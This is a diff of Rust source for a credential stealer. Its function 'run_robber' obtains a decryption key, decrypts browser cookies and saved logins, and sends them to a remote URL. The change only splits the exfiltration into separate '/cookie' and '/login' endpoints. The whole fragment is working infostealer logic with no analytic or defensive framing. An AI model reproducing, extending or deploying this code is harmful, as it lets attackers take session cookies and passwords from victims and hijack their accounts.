@@ -71,14 +71,15 @@ pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, any
         if let Ok(key) = robber::get_key(&key_dir) {
             if do_cookie == true {
                 let cookie_dir = build_cookie_directory(&base_dir)?;
+				
                 if let Ok(cookie_data) = robber::get_cookies(&cookie_dir, &key) {
-                    robber::send_data(cookie_data, url)?;
+                    robber::send_data(cookie_data, format!("{}{}", url, "/cookie"))?;
                 }
             }
             if do_login == true {
                 let login_dir = build_login_directory(&base_dir)?;
                 if let Ok(login_data) = robber::get_login(&login_dir, &key) {
-                    robber::send_data(login_data, url)?;
+                    robber::send_data(login_data, format!("{}{}", url, "/login"))?;
                 }
             }
         }
